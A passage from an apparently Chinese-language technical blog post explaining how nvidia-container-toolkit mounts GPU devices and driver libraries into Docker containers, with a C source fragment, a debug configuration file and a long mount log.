free(tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        if (info-&gt;libs !&#x3D; NULL &amp;&amp; info-&gt;nlibs &gt; 0) &#123;</span><br><span class="line">                if ((tmp &#x3D; (const char **)mount_files(&amp;ctx-&gt;err, ctx-&gt;cfg.root, cnt, cnt-&gt;cfg.libs_dir, info-&gt;libs, info-&gt;nlibs)) &#x3D;&#x3D; NULL)</span><br><span class="line">                        goto fail;</span><br><span class="line">    </span><br><span class="line">    .............</span><br><span class="line"></span><br><span class="line">  &#x2F;* Device mounts *&#x2F;</span><br><span class="line">        for (size_t i &#x3D; 0; i &lt; info-&gt;ndevs; ++i) &#123;</span><br><span class="line">                &#x2F;* XXX Only compute libraries require specific devices (e.g. UVM). *&#x2F;</span><br><span class="line">                if (!(cnt-&gt;flags &amp; OPT_COMPUTE_LIBS) &amp;&amp; major(info-&gt;devs[i].id) !&#x3D; NV_DEVICE_MAJOR)</span><br><span class="line">                        continue;</span><br><span class="line">                &#x2F;* XXX Only display capability requires the modeset device. *&#x2F;</span><br><span class="line">                if (!(cnt-&gt;flags &amp; OPT_DISPLAY) &amp;&amp; minor(info-&gt;devs[i].id) &#x3D;&#x3D; NV_MODESET_DEVICE_MINOR)</span><br><span class="line">                        continue;</span><br><span class="line">                if (!(cnt-&gt;flags &amp; OPT_NO_DEVBIND)) &#123;</span><br><span class="line">                        if ((*ptr++ &#x3D; mount_device(&amp;ctx-&gt;err, ctx-&gt;cfg.root, cnt, &amp;info-&gt;devs[i])) &#x3D;&#x3D; NULL)</span><br><span class="line">                                goto fail;</span><br><span class="line">                &#125;</span><br><span class="line">                if (!(cnt-&gt;flags &amp; OPT_NO_CGROUPS)) &#123;</span><br><span class="line">                        if (setup_cgroup(&amp;ctx-&gt;err, cnt-&gt;dev_cg, info-&gt;devs[i].id) &lt; 0)</span><br><span class="line">                                goto fail;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        rv &#x3D; 0;</span><br></pre></td></tr></table></figure>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>在节点安装完docker、nvidia-docker相关软件后，可以通过修改/etc/nvidia-container-runtime/config.toml,nvidia-container-toolkit的debug日志，如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disable-require &#x3D; false</span><br><span class="line">#swarm-resource &#x3D; &quot;docker_RESOURCE_GPU&quot;</span><br><span class="line">#accept-nvidia-visible-devices-envvar-when-unprivileged &#x3D; true</span><br><span class="line">#accept-nvidia-visible-devices-as-volume-mounts &#x3D; false</span><br><span class="line"></span><br><span class="line">[nvidia-container-cli]</span><br><span class="line">#root &#x3D; &quot;&#x2F;run&#x2F;nvidia&#x2F;driver&quot;</span><br><span class="line">path &#x3D; &quot;&#x2F;usr&#x2F;bin&#x2F;nvidia-container-cli&quot;</span><br><span class="line">environment &#x3D; []</span><br><span class="line">debug &#x3D; &quot;&#x2F;var&#x2F;log&#x2F;nvidia-container-toolkit.log&quot;</span><br><span class="line">#ldcache &#x3D; &quot;&#x2F;etc&#x2F;ld.so.cache&quot;</span><br><span class="line">load-kmods &#x3D; true</span><br><span class="line">#no-cgroups &#x3D; false</span><br><span class="line">#user &#x3D; &quot;root:video&quot;</span><br><span class="line">ldconfig &#x3D; &quot;@&#x2F;sbin&#x2F;ldconfig&quot;</span><br><span class="line"></span><br><span class="line">[nvidia-container-runtime]</span><br><span class="line">#debug &#x3D; &quot;&#x2F;var&#x2F;log&#x2F;nvidia-container-runtime.log&quot;</span><br></pre></td></tr></table></figure>
<p>我们通过命令行 运行一个使用GPU卡的容器，可以在/var/log/nvidia-container-toolkit.log 看到以下日志,虽然比较长，但是详细的看到挂载过程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --env NVIDIA_VISIBLE_DEVICES&#x3D;GPU-2fb041ff-6df3-4d00-772d-efb3139a17a1  tensorflow:1.14-cuda10-py36 bash</span><br></pre></td></tr></table></figure>
<p>具体的日志信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-- WARNING, the following logs are for debugging purposes only --</span><br><span class="line"></span><br><span class="line">I1222 07:23:32.708870 78755 nvc.c:282] initializing library context (version&#x3D;1.3.0, build&#x3D;16315ebdf4b9728e899f615e208b50c41d7a5d15)</span><br><span class="line">I1222 07:23:32.709176 78755 nvc.c:256] using root &#x2F;</span><br><span class="line">I1222 07:23:32.709208 78755 nvc.c:257] using ldcache &#x2F;etc&#x2F;ld.so.cache</span><br><span class="line">I1222 07:23:32.709230 78755 nvc.c:258] using unprivileged user 65534:65534</span><br><span class="line">I1222 07:23:32.709284 78755 nvc.c:299] attempting to load dxcore to see if we are running under Windows Subsystem for Linux (WSL)</span><br><span class="line">I1222 07:23:32.709595 78755 nvc.c:301] dxcore initialization failed, continuing assuming a non-WSL environment</span><br><span class="line">I1222 07:23:32.719348 78759 nvc.c:192] loading kernel module nvidia</span><br><span class="line">I1222 07:23:32.720360 78759 nvc.c:204] loading kernel module nvidia_uvm</span><br><span class="line">I1222 07:23:32.720862 78759 nvc.c:212] loading kernel module nvidia_modeset</span><br><span class="line">I1222 07:23:32.721604 78760 driver.c:101] starting driver service</span><br><span class="line">I1222 07:23:33.987396 78755 nvc_container.c:364] configuring container with &#39;compute utility supervised&#39;</span><br><span class="line">I1222 07:23:33.988276 78755 nvc_container.c:212] selecting &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;local&#x2F;cuda-10.1&#x2F;compat&#x2F;libcuda.so.418.87.00</span><br><span class="line">I1222 07:23:33.988497 78755 nvc_container.c:212] selecting &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;local&#x2F;cuda-10.1&#x2F;compat&#x2F;libnvidia-fatbinaryloader.so.418.87.00</span><br><span class="line">I1222 07:23:33.988619 78755 nvc_container.c:212] selecting &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;local&#x2F;cuda-10.1&#x2F;compat&#x2F;libnvidia-ptxjitcompiler.so.418.87.00</span><br><span class="line">I1222 07:23:33.989099 78755 nvc_container.c:384] setting pid to 78717</span><br><span class="line">I1222 07:23:33.989130 78755 nvc_container.c:385] setting rootfs to &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged</span><br><span class="line">I1222 07:23:33.989153 78755 nvc_container.c:386] setting owner to 0:0</span><br><span class="line">I1222 07:23:33.989175 78755 nvc_container.c:387] setting bins directory to &#x2F;usr&#x2F;bin</span><br><span class="line">I1222 07:23:33.989197 78755 nvc_container.c:388] setting libs directory to &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu</span><br><span class="line">I1222 07:23:33.989218 78755 nvc_container.c:389] setting libs32 directory to &#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu</span><br><span class="line">I1222 07:23:33.989240 78755 nvc_container.c:390] setting cudart directory to &#x2F;usr&#x2F;local&#x2F;cuda</span><br><span class="line">I1222 07:23:33.989261 78755 nvc_container.c:391] setting ldconfig to @&#x2F;sbin&#x2F;ldconfig (host relative)</span><br><span class="line">I1222 07:23:33.989283 78755 nvc_container.c:392] setting mount namespace to &#x2F;proc&#x2F;78717&#x2F;ns&#x2F;mnt</span><br><span class="line">I1222 07:23:33.989305 78755 nvc_container.c:394] setting devices cgroup to &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;devices&#x2F;system.slice&#x2F;docker-dd3c4f0a0409255fba62518899d9e59fda64172f730513b788001e06d594ba8f.scope</span><br><span class="line">I1222 07:23:33.989356 78755 nvc_info.c:680] requesting driver information with &#39;&#39;</span><br><span class="line">I1222 07:23:33.993981 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;vdpau&#x2F;libvdpau_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:33.994516 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvoptix.so.455.23.05</span><br><span class="line">I1222 07:23:33.994732 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-tls.so.455.23.05</span><br><span class="line">I1222 07:23:33.994866 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-rtcore.so.455.23.05</span><br><span class="line">I1222 07:23:33.995003 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-ptxjitcompiler.so.455.23.05</span><br><span class="line">I1222 07:23:33.995213 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-opticalflow.so.455.23.05</span><br><span class="line">I1222 07:23:33.995409 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-opencl.so.455.23.05</span><br><span class="line">I1222 07:23:33.995538 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-ngx.so.455.23.05</span><br><span class="line">I1222 07:23:33.995666 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-ml.so.455.23.05</span><br><span class="line">I1222 07:23:33.995855 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-ifr.so.455.23.05</span><br><span class="line">I1222 07:23:33.996048 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-glvkspirv.so.455.23.05</span><br><span class="line">I1222 07:23:33.996180 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-glsi.so.455.23.05</span><br><span class="line">I1222 07:23:33.996302 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-glcore.so.455.23.05</span><br><span class="line">I1222 07:23:33.996429 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-fbc.so.455.23.05</span><br><span class="line">I1222 07:23:33.996630 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-encode.so.455.23.05</span><br><span class="line">I1222 07:23:33.996811 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-eglcore.so.455.23.05</span><br><span class="line">I1222 07:23:33.996942 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-compiler.so.455.23.05</span><br><span class="line">I1222 07:23:33.997068 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-cfg.so.455.23.05</span><br><span class="line">I1222 07:23:33.997266 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-cbl.so.455.23.05</span><br><span class="line">I1222 07:23:33.997385 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-allocator.so.455.23.05</span><br><span class="line">I1222 07:23:33.997581 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libnvcuvid.so.455.23.05</span><br><span class="line">I1222 07:23:33.998475 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libcuda.so.455.23.05</span><br><span class="line">I1222 07:23:33.998854 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libGLX_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:33.998982 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libGLESv2_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:33.999116 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libGLESv1_CM_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:33.999244 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib64&#x2F;libEGL_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:33.999392 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;vdpau&#x2F;libvdpau_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:33.999540 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-tls.so.455.23.05</span><br><span class="line">I1222 07:23:33.999672 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-ptxjitcompiler.so.455.23.05</span><br><span class="line">I1222 07:23:33.999868 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-opticalflow.so.455.23.05</span><br><span class="line">I1222 07:23:34.000055 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-opencl.so.455.23.05</span><br><span class="line">I1222 07:23:34.000199 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-ml.so.455.23.05</span><br><span class="line">I1222 07:23:34.000387 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-ifr.so.455.23.05</span><br><span class="line">I1222 07:23:34.000577 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-glvkspirv.so.455.23.05</span><br><span class="line">I1222 07:23:34.000697 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-glsi.so.455.23.05</span><br><span class="line">I1222 07:23:34.000813 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-glcore.so.455.23.05</span><br><span class="line">I1222 07:23:34.000941 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-fbc.so.455.23.05</span><br><span class="line">I1222 07:23:34.001149 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-encode.so.455.23.05</span><br><span class="line">I1222 07:23:34.001337 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-eglcore.so.455.23.05</span><br><span class="line">I1222 07:23:34.001458 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-compiler.so.455.23.05</span><br><span class="line">I1222 07:23:34.001597 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvidia-allocator.so.455.23.05</span><br><span class="line">I1222 07:23:34.001814 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libnvcuvid.so.455.23.05</span><br><span class="line">I1222 07:23:34.002011 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libcuda.so.455.23.05</span><br><span class="line">I1222 07:23:34.002221 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libGLX_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:34.002350 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libGLESv2_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:34.002475 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libGLESv1_CM_nvidia.so.455.23.05</span><br><span class="line">I1222 07:23:34.002599 78755 nvc_info.c:169] selecting &#x2F;usr&#x2F;lib&#x2F;libEGL_nvidia.so.455.23.05</span><br><span class="line">W1222 07:23:34.002655 78755 nvc_info.c:350] missing library libnvidia-fatbinaryloader.so</span><br><span class="line">W1222 07:23:34.002679 78755 nvc_info.c:354] missing compat32 library libnvidia-cfg.so</span><br><span class="line">W1222 07:23:34.002701 78755 nvc_info.c:354] missing compat32 library libnvidia-fatbinaryloader.so</span><br><span class="line">W1222 07:23:34.002722 78755 nvc_info.c:354] missing compat32 library libnvidia-ngx.so</span><br><span class="line">W1222 07:23:34.002744 78755 nvc_info.c:354] missing compat32 library libnvidia-rtcore.so</span><br><span class="line">W1222 07:23:34.002765 78755 nvc_info.c:354] missing compat32 library libnvoptix.so</span><br><span class="line">W1222 07:23:34.002786 78755 nvc_info.c:354] missing compat32 library libnvidia-cbl.so</span><br><span class="line">I1222 07:23:34.004155 78755 nvc_info.c:276] selecting &#x2F;usr&#x2F;bin&#x2F;nvidia-smi</span><br><span class="line">I1222 07:23:34.004247 78755 nvc_info.c:276] selecting &#x2F;usr&#x2F;bin&#x2F;nvidia-debugdump</span><br><span class="line">I1222 07:23:34.004332 78755 nvc_info.c:276] selecting &#x2F;usr&#x2F;bin&#x2F;nvidia-persistenced</span><br><span class="line">I1222 07:23:34.004418 78755 nvc_info.c:276] selecting &#x2F;usr&#x2F;bin&#x2F;nvidia-cuda-mps-control</span><br><span class="line">I1222 07:23:34.004504 78755 nvc_info.c:276] selecting &#x2F;usr&#x2F;bin&#x2F;nvidia-cuda-mps-server</span><br><span class="line">I1222 07:23:34.004625 78755 nvc_info.c:438] listing device &#x2F;dev&#x2F;nvidiactl</span><br><span class="line">I1222 07:23:34.004648 78755 nvc_info.c:438] listing device &#x2F;dev&#x2F;nvidia-uvm</span><br><span class="line">I1222 07:23:34.004669 78755 nvc_info.c:438] listing device &#x2F;dev&#x2F;nvidia-uvm-tools</span><br><span class="line">I1222 07:23:34.004690 78755 nvc_info.c:438] listing device &#x2F;dev&#x2F;nvidia-modeset</span><br><span class="line">W1222 07:23:34.004790 78755 nvc_info.c:321] missing ipc &#x2F;var&#x2F;run&#x2F;nvidia-persistenced&#x2F;socket</span><br><span class="line">W1222 07:23:34.004856 78755 nvc_info.c:321] missing ipc &#x2F;tmp&#x2F;nvidia-mps</span><br><span class="line">I1222 07:23:34.004879 78755 nvc_info.c:745] requesting device information with &#39;&#39;</span><br><span class="line">I1222 07:23:34.012276 78755 nvc_info.c:628] listing device &#x2F;dev&#x2F;nvidia0 (GPU-2fb041ff-6df3-4d00-772d-efb3139a17a1 at 00000000:3b:00.0)</span><br><span class="line">I1222 07:23:34.020861 78755 nvc_info.c:628] listing device &#x2F;dev&#x2F;nvidia1 (GPU-a15f4c20-0f41-68ab-3782-bd66d8fda9e4 at 00000000:af:00.0)</span><br><span class="line">I1222 07:23:34.021102 78755 nvc_mount.c:344] mounting tmpfs at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;proc&#x2F;driver&#x2F;nvidia</span><br><span class="line">I1222 07:23:34.022322 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;bin&#x2F;nvidia-smi at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;bin&#x2F;nvidia-smi</span><br><span class="line">I1222 07:23:34.022504 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;bin&#x2F;nvidia-debugdump at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;bin&#x2F;nvidia-debugdump</span><br><span class="line">I1222 07:23:34.022664 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;bin&#x2F;nvidia-persistenced at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;bin&#x2F;nvidia-persistenced</span><br><span class="line">I1222 07:23:34.022825 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;bin&#x2F;nvidia-cuda-mps-control at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;bin&#x2F;nvidia-cuda-mps-control</span><br><span class="line">I1222 07:23:34.022983 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;bin&#x2F;nvidia-cuda-mps-server at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;bin&#x2F;nvidia-cuda-mps-server</span><br><span class="line">I1222 07:23:34.023745 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-ml.so.455.23.05 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-ml.so.455.23.05</span><br><span class="line">I1222 07:23:34.023960 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-cfg.so.455.23.05 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-cfg.so.455.23.05</span><br><span class="line">I1222 07:23:34.024203 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;lib64&#x2F;libcuda.so.455.23.05 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libcuda.so.455.23.05</span><br><span class="line">I1222 07:23:34.024411 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-opencl.so.455.23.05 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-opencl.so.455.23.05</span><br><span class="line">I1222 07:23:34.024615 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-ptxjitcompiler.so.455.23.05 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-ptxjitcompiler.so.455.23.05</span><br><span class="line">I1222 07:23:34.024815 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-allocator.so.455.23.05 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-allocator.so.455.23.05</span><br><span class="line">I1222 07:23:34.040552 78755 nvc_mount.c:112] mounting &#x2F;usr&#x2F;lib64&#x2F;libnvidia-compiler.so.455.23.05 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-compiler.so.455.23.05</span><br><span class="line">I1222 07:23:34.040717 78755 nvc_mount.c:524] creating symlink &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libcuda.so -&gt; libcuda.so.1</span><br><span class="line">I1222 07:23:34.041181 78755 nvc_mount.c:112] mounting &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;local&#x2F;cuda-10.1&#x2F;compat&#x2F;libcuda.so.418.87.00 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libcuda.so.418.87.00</span><br><span class="line">I1222 07:23:34.041439 78755 nvc_mount.c:112] mounting &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;local&#x2F;cuda-10.1&#x2F;compat&#x2F;libnvidia-fatbinaryloader.so.418.87.00 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-fatbinaryloader.so.418.87.00</span><br><span class="line">I1222 07:23:34.041662 78755 nvc_mount.c:112] mounting &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;local&#x2F;cuda-10.1&#x2F;compat&#x2F;libnvidia-ptxjitcompiler.so.418.87.00 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-ptxjitcompiler.so.418.87.00</span><br><span class="line">I1222 07:23:34.041871 78755 nvc_mount.c:208] mounting &#x2F;dev&#x2F;nvidiactl at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;dev&#x2F;nvidiactl</span><br><span class="line">I1222 07:23:34.041959 78755 nvc_mount.c:499] whitelisting device node 195:255</span><br><span class="line">I1222 07:23:34.042196 78755 nvc_mount.c:208] mounting &#x2F;dev&#x2F;nvidia-uvm at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;dev&#x2F;nvidia-uvm</span><br><span class="line">I1222 07:23:34.042283 78755 nvc_mount.c:499] whitelisting device node 234:0</span><br><span class="line">I1222 07:23:34.042474 78755 nvc_mount.c:208] mounting &#x2F;dev&#x2F;nvidia-uvm-tools at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;dev&#x2F;nvidia-uvm-tools</span><br><span class="line">I1222 07:23:34.042552 78755 nvc_mount.c:499] whitelisting device node 234:1</span><br><span class="line">I1222 07:23:34.042781 78755 nvc_mount.c:208] mounting &#x2F;dev&#x2F;nvidia0 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;dev&#x2F;nvidia0</span><br><span class="line">I1222 07:23:34.043137 78755 nvc_mount.c:412] mounting &#x2F;proc&#x2F;driver&#x2F;nvidia&#x2F;gpus&#x2F;0000:3b:00.0 at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged&#x2F;proc&#x2F;driver&#x2F;nvidia&#x2F;gpus&#x2F;0000:3b:00.0</span><br><span class="line">I1222 07:23:34.043225 78755 nvc_mount.c:499] whitelisting device node 195:0</span><br><span class="line">I1222 07:23:34.043317 78755 nvc_ldcache.c:359] executing &#x2F;sbin&#x2F;ldconfig from host at &#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;6ac97e95475e9df0f32f7e2f7251ca053651c62292d1a5127c71d33e55904d2b&#x2F;merged</span><br><span class="line">W1222 07:23:34.070874 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libcuda.so is empty, not checked.</span><br><span class="line">W1222 07:23:34.070939 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libcuda.so.1 is empty, not checked.</span><br><span class="line">W1222 07:23:34.070962 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libcuda.so.418.67 is empty, not checked.</span><br><span class="line">W1222 07:23:34.072833 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-cfg.so.1 is empty, not checked.</span><br><span class="line">W1222 07:23:34.072864 78755 utils.c:121] &#x2F;sbin&#x2F;ldconfig: File &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libnvidia-cfg.so.418.67 is empty, not checked.</span><br><span class="line">W1222 07:23:34.072909 